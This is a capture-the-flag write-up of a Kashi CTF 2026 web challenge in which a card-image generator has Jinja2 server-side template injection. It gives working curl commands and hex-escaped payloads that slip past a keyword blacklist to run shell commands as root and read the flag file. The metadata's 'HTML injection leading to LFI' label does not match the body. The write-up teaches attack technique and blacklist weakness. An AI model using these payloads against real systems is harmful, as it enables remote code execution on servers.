---
title: "Nexus 2"
ctf: "Kashi CTF 2026"
date: "2026-04-03"
description: "Server-side HTML injection leading to LFI"
points: 500
tags: ["Web", "Injection"]
---

## tl;dr

This challenge exposed a web service called **PRISM // Identity Protocol**. The interface was minimal: a single text field named `name` and a submit button labeled "Generate ID Card." The hint — "The lights from the future have become stronger, you have to be careful boy!!!" — suggested something visual or rendering-related, so the first assumption was that the server takes user input and renders it into an image.

**Challenge points:** 500

---

## Recon

```bash
curl -i -s http://34.126.223.46:18821/
```

Response showed a single HTML form:

```html
<form method="POST">
    <input type="text" name="name" ...>
    <button type="submit">Generate ID Card</button>
</form>
```

No obvious API endpoints, scripts, or interesting static references.

---

## Testing Normal Input

```bash
curl -i -s -X POST -d 'name=test' http://34.126.223.46:18821/
```

Instead of HTML, the server returned a PNG:

```
Content-Disposition: attachment; filename=prism_7cfd9bec.png
Content-Type: image/png
```

Inspecting the file:

```bash
file /tmp/prism_test.png
# PNG image data, 700 x 450, 8-bit/color RGB
```

The image showed the submitted name inside a "REGISTERED IDENTITY" field, establishing the basic flow:

1. User submits `name`
2. Server renders an HTML template
3. Server converts / screenshots that template into a PNG
4. PNG is returned to the user

---

## SSTI Detection

Testing classic Jinja2 SSTI:

```bash
curl -s -X POST --data-urlencode "name={{7*7}}" http://34.126.223.46:18821/ -o /tmp/jinja.png
```

The generated image displayed `49` — **server-side template injection confirmed.** The input was being interpreted by Jinja2 before rendering into the card.

HTML injection was also tested (`<b>bold</b>`), but the card displayed it as a literal string. This was SSTI specifically, not HTML injection.

---

## Initial RCE Attempt and Blacklist Discovery

The standard Jinja2 RCE payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Instead of a PNG, the server returned HTML containing:

```html
<div class="error">Nice try, but that input is not allowed!</div>
```

The application had a blacklist rejecting strings like `__globals__`, `os`, `popen`, `import`, and `builtins`.

---

## Bypassing the Blacklist

The goal: keep Jinja2 evaluation while avoiding blacklisted keywords literally.

The easiest allowed object was `lipsum`, which exists in Jinja environments by default:

```bash
curl -s -X POST --data-urlencode "name={{ lipsum }}" http://34.126.223.46:18821/ -o /tmp/lipsum.png
```

✅ This rendered successfully.

From there, instead of writing blocked names directly, blocked attribute names were accessed using **hex-escaped strings** inside `attr()`:

```jinja2
{{ lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f') }}
```

This is `__globals__` encoded so the blacklist never sees the forbidden substring. It rendered successfully, proving the bypass worked.

Next, accessing the `os` module through the globals dictionary:

```jinja2
{{ (lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))|attr('get')('\x6f\x73') }}
```

Rendered as: `<module 'os' (frozen)>` — access to `os` without ever writing `__globals__` or `os` literally.

---

## Getting Command Execution

Resolving `popen` the same way and calling it:

```jinja2
{{ (((lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))|attr('get')('\x6f\x73'))|attr('\x70\x6f\x70\x65\x6e'))('id')|attr('\x72\x65\x61\x64')() }}
```

The PNG rendered:

```
uid=0(root) gid=0(root) groups=0(root)
```

**Full command execution confirmed. Server process running as root.**

---

## Reading the Flag

Final payload replacing `id` with `cat /flag.txt`:

```jinja2
{{ ((((lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))|attr('get')('\x6f\x73'))|attr('\x70\x6f\x70\x65\x6e'))('cat /flag.txt'))|attr('\x72\x65\x61\x64')() }}
```

```bash
curl -s -X POST --data-urlencode "name={{ ((((lipsum|attr('\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f'))|attr('get')('\x6f\x73'))|attr('\x70\x6f\x70\x65\x6e'))('cat /flag.txt'))|attr('\x72\x65\x61\x64')() }}" http://34.126.223.46:18821/ -o /tmp/flag_final.png
```

The returned image displayed the flag inside the ID card.

---

## Flag

```
kashiCTF{txT98w0OITCLm4OX5IswmC2nvxakt8J5}
```

---

## Exploit Chain Summary

| Step | Action |
|------|--------|
| 1 | Submit `{{7*7}}` → rendered as `49` → SSTI confirmed |
| 2 | Submit blocked payload → error page → blacklist discovered |
| 3 | Use `lipsum` as gadget root (not blacklisted) |
| 4 | Access `__globals__` via hex-encoded `attr()` |
| 5 | Reach `os` module via `.get('\x6f\x73')` |
| 6 | Call `popen('id')` via hex-encoded attribute name |
| 7 | Confirm RCE as root |
| 8 | Read `/flag.txt` |

---

## What to Learn

- A generated image can still be a template injection target if user input is rendered into HTML before the screenshot/render step.
- `{{7*7}}` remains one of the fastest and most reliable SSTI probes for Jinja2.
- Blacklists are weak. If the sink is still reachable, encoding blocked strings often bypasses the filter.
- Jinja2 helper globals like `lipsum`, `namespace`, and similar built-ins can become useful gadget roots.
- `attr()` plus hex escapes is a strong blacklist bypass when dangerous attribute names are filtered.
- Once command execution is confirmed, simplify: prove RCE → confirm privilege level → read `/flag.txt`.
